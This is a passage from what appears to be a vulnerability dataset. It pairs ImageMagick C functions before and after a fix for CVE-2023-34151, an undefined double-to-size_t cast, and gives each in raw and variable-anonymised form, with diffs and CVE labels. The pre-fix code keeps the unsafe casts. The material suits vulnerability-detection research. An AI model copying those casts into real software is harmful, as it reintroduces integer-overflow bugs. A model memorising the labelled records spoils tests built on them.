  VAR_13=VAR_24;
  (void) memset(&VAR_18,0,sizeof(VAR_18));
  for (VAR_17=0; VAR_9[VAR_17] != (char *) NULL; VAR_17++)
  {
    if (*VAR_9[VAR_17] == '\0')
      continue;
    /* COMMENT_0 */
                                      
      
    VAR_11->affine.tx=VAR_12.xi-VAR_1->page.x;
    VAR_11->affine.ty=VAR_12.psi-VAR_1->page.y;
    (void) CloneString(&VAR_10->text,VAR_9[VAR_17]);
    if ((VAR_18.width == 0) || (VAR_10->gravity != VAR_28))
      (void) GetTypeMetrics(VAR_1,VAR_10,&VAR_18,VAR_3);
    VAR_19=CastDoubleToUnsigned(VAR_18.ascent-VAR_18.descent+0.5);
    if (VAR_19 == 0)
      VAR_19=VAR_2->pointsize;
    VAR_19+=(size_t) floor(VAR_2->interline_spacing+0.5);
    switch (VAR_10->gravity)
    {
      case VAR_29:
      default:
      {
        VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19;
        VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19;
        break;
      }
      case (GravityType) VAR_28:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
          VAR_11->affine.ry*VAR_19+VAR_11->affine.ry*
          (VAR_18.ascent+VAR_18.descent);
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
          VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
          VAR_18.ascent;
        break;
      }
      case (GravityType) VAR_30:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
          VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width/2.0+VAR_11->affine.ry*
          (VAR_18.ascent+VAR_18.descent);
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
          VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
          VAR_18.ascent-VAR_11->affine.rx*VAR_18.width/2.0;
        break;
      }
      case (GravityType) VAR_31:
      {
        VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
          VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width+VAR_11->affine.ry*
          (VAR_18.ascent+VAR_18.descent)-1.0;
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+VAR_17*
          VAR_11->affine.sy*VAR_19+VAR_11->affine.sy*
          VAR_18.ascent-VAR_11->affine.rx*VAR_18.width;
        break;
      }
      case (GravityType) VAR_32:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
          VAR_11->affine.ry*VAR_19+VAR_11->affine.ry*
          (VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
          VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19+
          VAR_11->affine.sy*(VAR_18.ascent+VAR_18.descent-
          (VAR_20-1.0)*VAR_19)/2.0;
        break;
      }
      case (GravityType) VAR_33:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
          VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width/2.0+VAR_11->affine.ry*
          (VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
          VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width/2.0+VAR_11->affine.sy*
          (VAR_18.ascent+VAR_18.descent-(VAR_20-1.0)*VAR_19)/2.0;
        break;
      }
      case (GravityType) VAR_34:
      {
        VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
          VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width+
          VAR_11->affine.ry*(VAR_18.ascent+VAR_18.descent-
          (VAR_20-1.0)*VAR_19)/2.0-1.0;
        VAR_15.y=(VAR_16.height == 0 ? -1.0 : 1.0)*VAR_11->affine.ty+
          VAR_16.height/2.0+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width+
          VAR_11->affine.sy*(VAR_18.ascent+VAR_18.descent-
          (VAR_20-1.0)*VAR_19)/2.0;
        break;
      }
      case (GravityType) VAR_35:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+VAR_17*
          VAR_11->affine.ry*VAR_19-VAR_11->affine.ry*
          (VAR_20-1.0)*VAR_19;
        VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
          VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
        break;
      }
      case (GravityType) VAR_36:
      {
        VAR_15.x=(VAR_16.width == 0 ? -1.0 : 1.0)*VAR_11->affine.tx+
          VAR_16.width/2.0+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width/2.0-
          VAR_11->affine.ry*(VAR_20-1.0)*VAR_19/2.0;
        VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
          VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width/2.0-
          VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
        break;
      }
      case (GravityType) VAR_37:
      {
        VAR_15.x=(VAR_16.width == 0 ? 1.0 : -1.0)*VAR_11->affine.tx+
          VAR_16.width+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width-
          VAR_11->affine.ry*(VAR_20-1.0)*VAR_19-1.0;
        VAR_15.y=(VAR_16.height == 0 ? 1.0 : -1.0)*VAR_11->affine.ty+
          VAR_16.height+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width-
          VAR_11->affine.sy*(VAR_20-1.0)*VAR_19+VAR_18.descent;
        break;
      }
    }
    switch (VAR_10->align)
    {
      case VAR_38:
      {
        VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19;
        VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19;
        break;
      }
      case VAR_39:
      {
        VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width/2.0;
        VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width/2.0;
        break;
      }
      case VAR_40:
      {
        VAR_15.x=VAR_11->affine.tx+VAR_17*VAR_11->affine.ry*VAR_19-
          VAR_11->affine.sx*VAR_18.width;
        VAR_15.y=VAR_11->affine.ty+VAR_17*VAR_11->affine.sy*VAR_19-
          VAR_11->affine.rx*VAR_18.width;
        break;
      }
      default:
        break;
    }
    if (VAR_2->undercolor.alpha != VAR_41)
      {
        DrawInfo
          *VAR_42;

        /* COMMENT_3 */
                   
          
        VAR_42=CloneDrawInfo((ImageInfo *) NULL,(DrawInfo *) NULL);
        VAR_42->fill=VAR_2->undercolor;
        VAR_42->affine=VAR_2->affine;
        VAR_42->affine.tx=VAR_15.x-VAR_2->affine.ry*VAR_18.ascent;
        VAR_42->affine.ty=VAR_15.y-VAR_2->affine.sy*VAR_18.ascent;
        (void) FormatLocaleString(VAR_7,VAR_6,
          ""rectangle 0.0,0.0 %g,%g"",VAR_18.origin.x,(double) VAR_19);
        (void) CloneString(&VAR_42->primitive,VAR_7);
        (void) DrawImage(VAR_1,VAR_42,VAR_3);
        (void) DestroyDrawInfo(VAR_42);
      }
    VAR_11->affine.tx=VAR_15.x;
    VAR_11->affine.ty=VAR_15.y;
    VAR_14=VAR_11->fill;
    if (VAR_11->stroke.alpha != VAR_41)
      VAR_14=VAR_11->stroke;
    (void) QueryColorname(VAR_1,&VAR_14,VAR_43,VAR_5,VAR_3);
    (void) FormatLocaleString(VAR_7,VAR_6,""stroke %s ""
      ""stroke-width %g line 0,0 %g,0"",VAR_5,(double)
      VAR_18.underline_thickness,(double) VAR_18.width);
    /* COMMENT_6 */
                               
      
    switch (VAR_10->decorate)
    {
      case VAR_44:
      {
        VAR_11->affine.ty-=(VAR_2->affine.sy*(VAR_18.ascent+
          VAR_18.descent-VAR_18.underline_position));
        (void) CloneString(&VAR_11->primitive,VAR_7);
        (void) DrawImage(VAR_1,VAR_11,VAR_3);
        break;
      }
      case VAR_45:
      {
        VAR_11->affine.ty-=(VAR_2->affine.sy*
          VAR_18.underline_position);
        (void) CloneString(&VAR_11->primitive,VAR_7);
        (void) DrawImage(VAR_1,VAR_11,VAR_3);
        break;
      }
      default:
        break;
    }
    VAR_13=RenderType(VAR_1,VAR_10,&VAR_15,&VAR_18,VAR_3);
    if (VAR_13 == VAR_22)
      break;

    if (VAR_10->decorate == VAR_46) {
        VAR_11->affine.ty-=(VAR_2->affine.sy*(VAR_19+
          VAR_18.underline_position+VAR_18.descent*2)/2.0);
        (void) CloneString(&VAR_11->primitive,VAR_7);
        (void) DrawImage(VAR_1,VAR_11,VAR_3);
    }
  }
  /* COMMENT_9 */
                         
    
  VAR_11=DestroyDrawInfo(VAR_11);
  VAR_10=DestroyDrawInfo(VAR_10);
  VAR_9=(char **) RelinquishMagickMemory(VAR_9);
  VAR_8=DestroyString(VAR_8);
  return(VAR_13);
}",,"--- func_before
+++ func_after
@@ -114,7 +114,7 @@
     (void) CloneString(&annotate->text,textlist[i]);
     if ((metrics.width == 0) || (annotate->gravity != NorthWestGravity))
       (void) GetTypeMetrics(image,annotate,&metrics,exception);
-    height=(size_t) floor(metrics.ascent-metrics.descent+0.5);
+    height=CastDoubleToUnsigned(metrics.ascent-metrics.descent+0.5);
     if (height == 0)
       height=draw_info->pointsize;
     height+=(size_t) floor(draw_info->interline_spacing+0.5);","{'deleted_lines': ['    height=(size_t) floor(metrics.ascent-metrics.descent+0.5);'], 'added_lines': ['    height=CastDoubleToUnsigned(metrics.ascent-metrics.descent+0.5);']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,MagickCore/geometry.c,ParseMetaGeometry,"MagickExport MagickStatusType ParseMetaGeometry(const char *geometry,ssize_t *x,
ssize_t *y,size_t *width,size_t *height)
{
GeometryInfo
geometry_info;
MagickStatusType
flags;
size_t
stasis_height,
stasis_width;
assert(x != (ssize_t *) NULL);
assert(y != (ssize_t *) NULL);
assert(width != (size_t *) NULL);
assert(height != (size_t *) NULL);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",geometry);
if ((geometry == (char *) NULL) || (*geometry == '\0'))
return(NoValue);
stasis_width=(*width);
stasis_height=(*height);
SetGeometryInfo(&geometry_info);
flags=GetGeometry(geometry,x,y,width,height);
if ((flags & PercentValue) != 0)
{
MagickStatusType
percent_flags;
PointInfo
scale;
percent_flags=ParseGeometry(geometry,&geometry_info);
scale.x=geometry_info.rho;
if ((percent_flags & RhoValue) == 0)
scale.x=100.0;
scale.y=geometry_info.sigma;
if ((percent_flags & SigmaValue) == 0)
scale.y=scale.x;
*width=(size_t) floor(scale.x*stasis_width/100.0+0.5);
*height=(size_t) floor(scale.y*stasis_height/100.0+0.5);
stasis_width=(*width);
stasis_height=(*height);
}
if ((flags & AspectRatioValue) != 0)
{
double
geometry_ratio,
image_ratio;
(void) ParseGeometry(geometry,&geometry_info);
geometry_ratio=geometry_info.rho;
image_ratio=(double) stasis_width*PerceptibleReciprocal((double)
stasis_height);
if (geometry_ratio >= image_ratio)
{
*width=stasis_width;
*height=(size_t) floor((double) (PerceptibleReciprocal(
geometry_ratio)*stasis_height*image_ratio)+0.5);
}
else
{
*width=CastDoubleToUnsigned(PerceptibleReciprocal(image_ratio)*
stasis_width*geometry_ratio+0.5);
*height=stasis_height;
}
stasis_width=(*width);
stasis_height=(*height);
}
if (((flags & AspectValue) != 0) || ((*width == stasis_width) &&
(*height == stasis_height)))
{
if ((flags & RhoValue) == 0)
*width=stasis_width;
if ((flags & SigmaValue) == 0)
*height=stasis_height;
}
else
{
double
scale_factor;
if ((stasis_width == 0) || (stasis_height == 0))
scale_factor=1.0;
else
if (((flags & RhoValue) != 0) && (flags & SigmaValue) != 0)
{
scale_factor=(double) *width/(double) stasis_width;
if ((flags & MinimumValue) == 0)
{
if (scale_factor > ((double) *height/(double) stasis_height))
scale_factor=(double) *height/(double) stasis_height;
}
else
if (scale_factor < ((double) *height/(double) stasis_height))
scale_factor=(double) *height/(double) stasis_height;
}
else
if ((flags & RhoValue) != 0)
{
scale_factor=(double) *width/(double) stasis_width;
if (((flags & MinimumValue) != 0) &&
(scale_factor < ((double) *width/(double) stasis_height)))
scale_factor=(double) *width/(double) stasis_height;
}
else
{
scale_factor=(double) *height/(double) stasis_height;
if (((flags & MinimumValue) != 0) &&
(scale_factor < ((double) *height/(double) stasis_width)))
scale_factor=(double) *height/(double) stasis_width;
}
*width=CastDoubleToUnsigned(MagickMax(floor(scale_factor*stasis_width+
0.5),1.0));
*height=CastDoubleToUnsigned(MagickMax(floor(scale_factor*stasis_height+
0.5),1.0));
}
if ((flags & GreaterValue) != 0)
{
if (stasis_width < *width)
*width=stasis_width;
if (stasis_height < *height)
*height=stasis_height;
}
if ((flags & LessValue) != 0)
{
if (stasis_width > *width)
*width=stasis_width;
if (stasis_height > *height)
*height=stasis_height;
}
if ((flags & AreaValue) != 0)
{
double
area,
distance;
PointInfo
scale;
(void) ParseGeometry(geometry,&geometry_info);
area=geometry_info.rho+sqrt(MagickEpsilon);
distance=sqrt((double) stasis_width*stasis_height);
scale.x=(double) stasis_width*PerceptibleReciprocal(distance*
PerceptibleReciprocal(sqrt(area)));
scale.y=(double) stasis_height*PerceptibleReciprocal(distance*
PerceptibleReciprocal(sqrt(area)));
if ((scale.x < (double) *width) || (scale.y < (double) *height))
{
*width=CastDoubleToUnsigned(stasis_width*PerceptibleReciprocal(
distance*PerceptibleReciprocal(sqrt(area)))+0.5);
*height=CastDoubleToUnsigned(stasis_height*PerceptibleReciprocal(
distance*PerceptibleReciprocal(sqrt(area)))+0.5);
}
}
return(flags);
}","MagickExport VAR_0 ParseMetaGeometry(const char *VAR_1,ssize_t *VAR_2,
ssize_t *VAR_3,size_t *VAR_4,size_t *VAR_5)
{
GeometryInfo
VAR_6;
MagickStatusType
VAR_7;
size_t
VAR_8,
VAR_9;
assert(VAR_2 != (ssize_t *) NULL);
assert(VAR_3 != (ssize_t *) NULL);
assert(VAR_4 != (size_t *) NULL);
assert(VAR_5 != (size_t *) NULL);
if (IsEventLogging() != VAR_10)
(void) LogMagickEvent(VAR_11,GetMagickModule(),""%s"",VAR_1);
if ((VAR_1 == (char *) NULL) || (*VAR_1 == '\0'))
return(VAR_12);
VAR_9=(*VAR_4);
VAR_8=(*VAR_5);
SetGeometryInfo(&VAR_6);
VAR_7=GetGeometry(VAR_1,VAR_2,VAR_3,VAR_4,VAR_5);
if ((VAR_7 & VAR_13) != 0)
{
MagickStatusType
VAR_14;
PointInfo
VAR_15;
VAR_14=ParseGeometry(VAR_1,&VAR_6);
VAR_15.x=VAR_6.rho;
if ((VAR_14 & VAR_16) == 0)
VAR_15.x=100.0;
VAR_15.y=VAR_6.sigma;
if ((VAR_14 & VAR_17) == 0)
VAR_15.y=VAR_15.x;
*VAR_4=(size_t) floor(VAR_15.x*VAR_9/100.0+0.5);
*VAR_5=(size_t) floor(VAR_15.y*VAR_8/100.0+0.5);
VAR_9=(*VAR_4);
VAR_8=(*VAR_5);
}
if ((VAR_7 & VAR_18) != 0)
{
double
VAR_19,
VAR_20;
(void) ParseGeometry(VAR_1,&VAR_6);
VAR_19=VAR_6.rho;
VAR_20=(double) VAR_9*PerceptibleReciprocal((double)
VAR_8);
if (VAR_19 >= VAR_20)
{
*VAR_4=VAR_9;
*VAR_5=(size_t) floor((double) (PerceptibleReciprocal(
VAR_19)*VAR_8*VAR_20)+0.5);
}
else
{
*VAR_4=CastDoubleToUnsigned(PerceptibleReciprocal(VAR_20)*
VAR_9*VAR_19+0.5);
*VAR_5=VAR_8;
}
VAR_9=(*VAR_4);
VAR_8=(*VAR_5);
}
if (((VAR_7 & VAR_21) != 0) || ((*VAR_4 == VAR_9) &&
(*VAR_5 == VAR_8)))
{
if ((VAR_7 & VAR_16) == 0)
*VAR_4=VAR_9;
if ((VAR_7 & VAR_17) == 0)
*VAR_5=VAR_8;
}
else
{
double
VAR_22;
if ((VAR_9 == 0) || (VAR_8 == 0))
VAR_22=1.0;
else
if (((VAR_7 & VAR_16) != 0) && (VAR_7 & VAR_17) != 0)
{
VAR_22=(double) *VAR_4/(double) VAR_9;
if ((VAR_7 & VAR_23) == 0)
{
if (VAR_22 > ((double) *VAR_5/(double) VAR_8))
VAR_22=(double) *VAR_5/(double) VAR_8;
}
else
if (VAR_22 < ((double) *VAR_5/(double) VAR_8))
VAR_22=(double) *VAR_5/(double) VAR_8;
}
else
if ((VAR_7 & VAR_16) != 0)
{
VAR_22=(double) *VAR_4/(double) VAR_9;
if (((VAR_7 & VAR_23) != 0) &&
(VAR_22 < ((double) *VAR_4/(double) VAR_8)))
VAR_22=(double) *VAR_4/(double) VAR_8;
}
else
{
VAR_22=(double) *VAR_5/(double) VAR_8;
if (((VAR_7 & VAR_23) != 0) &&
(VAR_22 < ((double) *VAR_5/(double) VAR_9)))
VAR_22=(double) *VAR_5/(double) VAR_9;
}
*VAR_4=CastDoubleToUnsigned(MagickMax(floor(VAR_22*VAR_9+
0.5),1.0));
*VAR_5=CastDoubleToUnsigned(MagickMax(floor(VAR_22*VAR_8+
0.5),1.0));
}
if ((VAR_7 & VAR_24) != 0)
{
if (VAR_9 < *VAR_4)
*VAR_4=VAR_9;
if (VAR_8 < *VAR_5)
*VAR_5=VAR_8;
}
if ((VAR_7 & VAR_25) != 0)
{
if (VAR_9 > *VAR_4)
*VAR_4=VAR_9;
if (VAR_8 > *VAR_5)
*VAR_5=VAR_8;
}
if ((VAR_7 & VAR_26) != 0)
{
double
VAR_27,
VAR_28;
PointInfo
VAR_15;
(void) ParseGeometry(VAR_1,&VAR_6);
VAR_27=VAR_6.rho+sqrt(VAR_29);
VAR_28=sqrt((double) VAR_9*VAR_8);
VAR_15.x=(double) VAR_9*PerceptibleReciprocal(VAR_28*
PerceptibleReciprocal(sqrt(VAR_27)));
VAR_15.y=(double) VAR_8*PerceptibleReciprocal(VAR_28*
PerceptibleReciprocal(sqrt(VAR_27)));
if ((VAR_15.x < (double) *VAR_4) || (VAR_15.y < (double) *VAR_5))
{
*VAR_4=CastDoubleToUnsigned(VAR_9*PerceptibleReciprocal(
VAR_28*PerceptibleReciprocal(sqrt(VAR_27)))+0.5);
*VAR_5=CastDoubleToUnsigned(VAR_8*PerceptibleReciprocal(
VAR_28*PerceptibleReciprocal(sqrt(VAR_27)))+0.5);
}
}
return(VAR_7);
}",,"MagickExport MagickStatusType ParseMetaGeometry(const char *geometry,ssize_t *x,
  ssize_t *y,size_t *width,size_t *height)
{
  GeometryInfo
    geometry_info;

  MagickStatusType
    flags;

  size_t
    stasis_height,
    stasis_width;

  /*
    Ensure the image geometry is valid.
  */
  assert(x != (ssize_t *) NULL);
  assert(y != (ssize_t *) NULL);
  assert(width != (size_t *) NULL);
  assert(height != (size_t *) NULL);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",geometry);
  if ((geometry == (char *) NULL) || (*geometry == '\0'))
    return(NoValue);
  /*
    Parse geometry using GetGeometry.
  */
  stasis_width=(*width);
  stasis_height=(*height);
  SetGeometryInfo(&geometry_info);
  flags=GetGeometry(geometry,x,y,width,height);
  if ((flags & PercentValue) != 0)
    {
      MagickStatusType
        percent_flags;

      PointInfo
        scale;

      /*
        Geometry is a percentage of the image size.
      */
      percent_flags=ParseGeometry(geometry,&geometry_info);
      scale.x=geometry_info.rho;
      if ((percent_flags & RhoValue) == 0)
        scale.x=100.0;
      scale.y=geometry_info.sigma;
      if ((percent_flags & SigmaValue) == 0)
        scale.y=scale.x;
      *width=CastDoubleToUnsigned(scale.x*stasis_width/100.0+0.5);
      *height=CastDoubleToUnsigned(scale.y*stasis_height/100.0+0.5);
      stasis_width=(*width);
      stasis_height=(*height);
    }
  if ((flags & AspectRatioValue) != 0)
    {
      double
        geometry_ratio,
        image_ratio;

      /*
        Geometry is a relative to image size and aspect ratio.
      */
      (void) ParseGeometry(geometry,&geometry_info);
      geometry_ratio=geometry_info.rho;
      image_ratio=(double) stasis_width*PerceptibleReciprocal((double)
        stasis_height);
      if (geometry_ratio >= image_ratio)
        {
          *width=stasis_width;
          *height=CastDoubleToUnsigned((double) (PerceptibleReciprocal(
            geometry_ratio)*stasis_height*image_ratio)+0.5);
        }
      else
        {
          *width=CastDoubleToUnsigned(PerceptibleReciprocal(image_ratio)*
            stasis_width*geometry_ratio+0.5);
          *height=stasis_height;
        }
      stasis_width=(*width);
      stasis_height=(*height);
    }
  if (((flags & AspectValue) != 0) || ((*width == stasis_width) &&
      (*height == stasis_height)))
    {
      if ((flags & RhoValue) == 0)
        *width=stasis_width;
      if ((flags & SigmaValue) == 0)
        *height=stasis_height;
    }
  else
    {
      double
        scale_factor;

      /*
        Respect aspect ratio of the image.
      */
      if ((stasis_width == 0) || (stasis_height == 0))
        scale_factor=1.0;
      else
        if (((flags & RhoValue) != 0) && (flags & SigmaValue) != 0)
          {
            scale_factor=(double) *width/(double) stasis_width;
            if ((flags & MinimumValue) == 0)
              {
                if (scale_factor > ((double) *height/(double) stasis_height))
                  scale_factor=(double) *height/(double) stasis_height;
              }
            else
              if (scale_factor < ((double) *height/(double) stasis_height))
                scale_factor=(double) *height/(double) stasis_height;
          }
        else
          if ((flags & RhoValue) != 0)
            {
              scale_factor=(double) *width/(double) stasis_width;
              if (((flags & MinimumValue) != 0) &&
                  (scale_factor < ((double) *width/(double) stasis_height)))
                scale_factor=(double) *width/(double) stasis_height;
            }
          else
            {
              scale_factor=(double) *height/(double) stasis_height;
              if (((flags & MinimumValue) != 0) &&
                  (scale_factor < ((double) *height/(double) stasis_width)))
                scale_factor=(double) *height/(double) stasis_width;
            }
      *width=CastDoubleToUnsigned(MagickMax(floor(scale_factor*stasis_width+
        0.5),1.0));
      *height=CastDoubleToUnsigned(MagickMax(floor(scale_factor*stasis_height+
        0.5),1.0));
    }
  if ((flags & GreaterValue) != 0)
    {
      if (stasis_width < *width)
        *width=stasis_width;
      if (stasis_height < *height)
        *height=stasis_height;
    }
  if ((flags & LessValue) != 0)
    {
      if (stasis_width > *width)
        *width=stasis_width;
      if (stasis_height > *height)
        *height=stasis_height;
    }
  if ((flags & AreaValue) != 0)
    {
      double
        area,
        distance;

      PointInfo
        scale;

      /*
        Geometry is a maximum area in pixels.
      */
      (void) ParseGeometry(geometry,&geometry_info);
      area=geometry_info.rho+sqrt(MagickEpsilon);
      distance=sqrt((double) stasis_width*stasis_height);
      scale.x=(double) stasis_width*PerceptibleReciprocal(distance*
        PerceptibleReciprocal(sqrt(area)));
      scale.y=(double) stasis_height*PerceptibleReciprocal(distance*
        PerceptibleReciprocal(sqrt(area)));
      if ((scale.x < (double) *width) || (scale.y < (double) *height))
        {
          *width=CastDoubleToUnsigned(stasis_width*PerceptibleReciprocal(
            distance*PerceptibleReciprocal(sqrt(area)))+0.5);
          *height=CastDoubleToUnsigned(stasis_height*PerceptibleReciprocal(
            distance*PerceptibleReciprocal(sqrt(area)))+0.5);
        }
    }
  return(flags);
}","MagickExport VAR_0 ParseMetaGeometry(const char *VAR_1,ssize_t *VAR_2,
  ssize_t *VAR_3,size_t *VAR_4,size_t *VAR_5)
{
  GeometryInfo
    VAR_6;

  MagickStatusType
    VAR_7;

  size_t
    VAR_8,
    VAR_9;

  /* COMMENT_0 */
                                       
    
  assert(VAR_2 != (ssize_t *) NULL);
  assert(VAR_3 != (ssize_t *) NULL);
  assert(VAR_4 != (size_t *) NULL);
  assert(VAR_5 != (size_t *) NULL);
  if (IsEventLogging() != VAR_10)
    (void) LogMagickEvent(VAR_11,GetMagickModule(),""%s"",VAR_1);
  if ((VAR_1 == (char *) NULL) || (*VAR_1 == '\0'))
    return(VAR_12);
  /* COMMENT_3 */
                                     
    
  VAR_9=(*VAR_4);
  VAR_8=(*VAR_5);
  SetGeometryInfo(&VAR_6);
  VAR_7=GetGeometry(VAR_1,VAR_2,VAR_3,VAR_4,VAR_5);
  if ((VAR_7 & VAR_13) != 0)
    {
      MagickStatusType
        VAR_14;

      PointInfo
        VAR_15;

      /* COMMENT_6 */
                                                   
        
      VAR_14=ParseGeometry(VAR_1,&VAR_6);
      VAR_15.x=VAR_6.rho;
      if ((VAR_14 & VAR_16) == 0)
        VAR_15.x=100.0;
      VAR_15.y=VAR_6.sigma;
      if ((VAR_14 & VAR_17) == 0)
        VAR_15.y=VAR_15.x;
      *VAR_4=CastDoubleToUnsigned(VAR_15.x*VAR_9/100.0+0.5);
      *VAR_5=CastDoubleToUnsigned(VAR_15.y*VAR_8/100.0+0.5);
      VAR_9=(*VAR_4);
      VAR_8=(*VAR_5);
    }
  if ((VAR_7 & VAR_18) != 0)
    {
      double
        VAR_19,
        VAR_20;

      /* COMMENT_9 */
                                                              
        
      (void) ParseGeometry(VAR_1,&VAR_6);
      VAR_19=VAR_6.rho;
      VAR_20=(double) VAR_9*PerceptibleReciprocal((double)
        VAR_8);
      if (VAR_19 >= VAR_20)
        {
          *VAR_4=VAR_9;
          *VAR_5=CastDoubleToUnsigned((double) (PerceptibleReciprocal(
            VAR_19)*VAR_8*VAR_20)+0.5);
        }
      else
        {
          *VAR_4=CastDoubleToUnsigned(PerceptibleReciprocal(VAR_20)*
            VAR_9*VAR_19+0.5);
          *VAR_5=VAR_8;
        }
      VAR_9=(*VAR_4);
      VAR_8=(*VAR_5);
    }
  if (((VAR_7 & VAR_21) != 0) || ((*VAR_4 == VAR_9) &&
      (*VAR_5 == VAR_8)))
    {
      if ((VAR_7 & VAR_16) == 0)
        *VAR_4=VAR_9;
      if ((VAR_7 & VAR_17) == 0)
        *VAR_5=VAR_8;
    }
  else
    {
      double
        VAR_22;

      /* COMMENT_12 */
                                          
        
      if ((VAR_9 == 0) || (VAR_8 == 0))
        VAR_22=1.0;
      else
        if (((VAR_7 & VAR_16) != 0) && (VAR_7 & VAR_17) != 0)
          {
            VAR_22=(double) *VAR_4/(double) VAR_9;
            if ((VAR_7 & VAR_23) == 0)
              {
                if (VAR_22 > ((double) *VAR_5/(double) VAR_8))
                  VAR_22=(double) *VAR_5/(double) VAR_8;
              }
            else
              if (VAR_22 < ((double) *VAR_5/(double) VAR_8))
                VAR_22=(double) *VAR_5/(double) VAR_8;
          }
        else
          if ((VAR_7 & VAR_16) != 0)
            {
              VAR_22=(double) *VAR_4/(double) VAR_9;
              if (((VAR_7 & VAR_23) != 0) &&
                  (VAR_22 < ((double) *VAR_4/(double) VAR_8)))
                VAR_22=(double) *VAR_4/(double) VAR_8;
            }
          else
            {
              VAR_22=(double) *VAR_5/(double) VAR_8;
              if (((VAR_7 & VAR_23) != 0) &&
                  (VAR_22 < ((double) *VAR_5/(double) VAR_9)))
                VAR_22=(double) *VAR_5/(double) VAR_9;
            }
      *VAR_4=CastDoubleToUnsigned(MagickMax(floor(VAR_22*VAR_9+
        0.5),1.0));
      *VAR_5=CastDoubleToUnsigned(MagickMax(floor(VAR_22*VAR_8+
        0.5),1.0));
    }
  if ((VAR_7 & VAR_24) != 0)
    {
      if (VAR_9 < *VAR_4)
        *VAR_4=VAR_9;
      if (VAR_8 < *VAR_5)
        *VAR_5=VAR_8;
    }
  if ((VAR_7 & VAR_25) != 0)
    {
      if (VAR_9 > *VAR_4)
        *VAR_4=VAR_9;
      if (VAR_8 > *VAR_5)
        *VAR_5=VAR_8;
    }
  if ((VAR_7 & VAR_26) != 0)
    {
      double
        VAR_27,
        VAR_28;

      PointInfo
        VAR_15;

      /* COMMENT_15 */
                                             
        
      (void) ParseGeometry(VAR_1,&VAR_6);
      VAR_27=VAR_6.rho+sqrt(VAR_29);
      VAR_28=sqrt((double) VAR_9*VAR_8);
      VAR_15.x=(double) VAR_9*PerceptibleReciprocal(VAR_28*
        PerceptibleReciprocal(sqrt(VAR_27)));
      VAR_15.y=(double) VAR_8*PerceptibleReciprocal(VAR_28*
        PerceptibleReciprocal(sqrt(VAR_27)));
      if ((VAR_15.x < (double) *VAR_4) || (VAR_15.y < (double) *VAR_5))
        {
          *VAR_4=CastDoubleToUnsigned(VAR_9*PerceptibleReciprocal(
            VAR_28*PerceptibleReciprocal(sqrt(VAR_27)))+0.5);
